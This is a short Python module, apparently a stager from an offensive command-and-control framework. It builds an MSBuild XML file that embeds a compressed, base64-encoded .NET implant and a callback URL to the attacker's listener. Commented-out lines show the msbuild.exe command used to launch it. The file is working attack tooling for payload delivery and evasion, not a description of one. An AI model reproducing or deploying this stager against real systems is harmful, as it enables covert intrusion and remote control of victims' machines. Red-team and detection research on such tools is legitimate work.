from core.teamserver.stager import Stager
from core.utils import gen_random_string_no_digits
from core.teamserver.utils import dotnet_deflate_and_encode


class STStager(Stager):
    def __init__(self):
        self.name = 'msbuild'
        self.description = 'Stage via MSBuild XML inline C# task'
        self.suggestions = ''
        self.extension = 'xml'
        self.author = '@byt3bl33d3r'
        self.options = {}

    def generate(self, listener):
        with open('./core/teamserver/data/naga.exe', 'rb') as dll:
            with open('./core/teamserver/stagers/templates/msbuild.xml') as template:
                template = template.read()
                template = template.replace('C2_URL', f"{listener.name}://{listener['BindIP']}:{listener['Port']}")
                template = template.replace("NAME_GOES_HERE", gen_random_string_no_digits(5))
                template = template.replace("BASE64_ENCODED_ASSEMBLY", dotnet_deflate_and_encode(dll.read()))
                return template

                #print_good(f"Generated stager to {stager.name}")
                #print_info(
                #    f"Launch with 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe {stager_filename}'")
